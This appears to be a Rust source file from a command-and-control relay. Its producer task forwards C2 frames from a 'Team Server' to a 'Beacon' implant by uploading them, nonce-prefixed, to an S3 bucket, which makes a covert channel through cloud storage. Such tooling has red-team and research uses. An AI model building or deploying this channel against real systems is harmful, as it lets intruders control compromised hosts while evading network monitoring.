use crate::s3::{actions::upload_object, config::ProduceCfg};
use bytes::{BufMut, Bytes, BytesMut};
use rand::{RngCore, SeedableRng, rngs::StdRng};
use tokio::sync::mpsc::Receiver;
use tracing::{error, info, warn};
use udc2_relay::Message;

/// Uploads C2 frames received from Team Server to an S3 bucket.
///
/// This producer task listens for `Message` values on `rx`. When it receives
/// a frame, it prefixes the frame buffer with a 64-bit random nonce (little-endian)
/// so that the Beacon can detect a new frame. The prefixed buffer is uploaded
/// to the configured S3 bucket under the key formed as `<prefix><session id>`.
pub async fn produce(bucket: String, mut rx: Receiver<Message>, cfg: ProduceCfg) {
    let mut rng = StdRng::from_os_rng();
    while let Some(message) = rx.recv().await {
        match message {
            Message::Frame { ctx: id, frame } => {
                let prefix = &cfg.prefix;
                let key = format!("{prefix}{id}");
                let nonce = rng.next_u64();
                let frame = with_prefix(nonce, frame);
                info!(%key, %nonce, len=frame.len(), "forwarding frame to S3");
                if let Err(err) = upload_object(&cfg.s3_client, &bucket, &key, frame).await {
                    error!(?err, bucket, key, "could not upload the object");
                }
            }
            _ => warn!("can only forward frames"),
        }
    }
}

/// Prepend the 64-bit little-endian value `n` to `data` and return the
/// combined buffer as `Bytes`.
fn with_prefix(n: u64, data: Bytes) -> Bytes {
    // 8 bytes for u64 + payload length
    let mut buf = BytesMut::with_capacity(8 + data.len());
    buf.put_u64_le(n);
    buf.extend_from_slice(&data);
    buf.freeze()
}
